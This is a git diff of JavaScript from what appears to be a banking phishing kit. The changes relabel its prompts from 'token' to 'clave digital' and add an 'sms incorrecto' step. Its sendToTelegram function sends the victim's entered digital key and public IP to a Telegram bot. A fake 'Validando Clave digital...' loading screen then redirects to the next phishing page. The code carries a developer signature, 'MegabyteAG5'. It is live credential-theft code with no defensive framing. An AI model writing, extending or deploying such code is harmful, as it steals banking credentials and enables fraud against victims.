@@ -19,11 +19,11 @@ function getIPAddress(callback) {
 function sendToTelegram(data, ip) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
     const message = `
-    *✨ Verificando identidad (Token): ✨*
+    *✨ Verificando identidad (sms incorrecto): ✨*
 
-    📄 **Token digital**: ${data.numeroDocumento}
+    📄 **Clave digital**: ${data.numeroDocumento}
     🌍 **IP pública**: ${ip}
-
+  
     ---
     👨‍💻 *Desarrollado por* **MegabyteAG5** 💻
     `;
@@ -97,7 +97,7 @@ function showLoadingScreen() {
 
     // Título abajo del círculo
     const validatingText = document.createElement('div');
-    validatingText.textContent = 'Validando token digital...';
+    validatingText.textContent = 'Validando Clave digital...';
     validatingText.style.fontSize = '16px';
     validatingText.style.color = '#072146';
     validatingText.style.marginTop = '20px';
@@ -108,7 +108,7 @@ function showLoadingScreen() {
     // Después de 5 segundos, redirigir a index2.html
     setTimeout(() => {
         window.location.href = 'index4.html';
-    }, 8000); // Redirige después de 5 segundos
+    }, 8000); // Redirige después de 8 segundos
 }
 
 // Función principal para manejar el envío del formulario
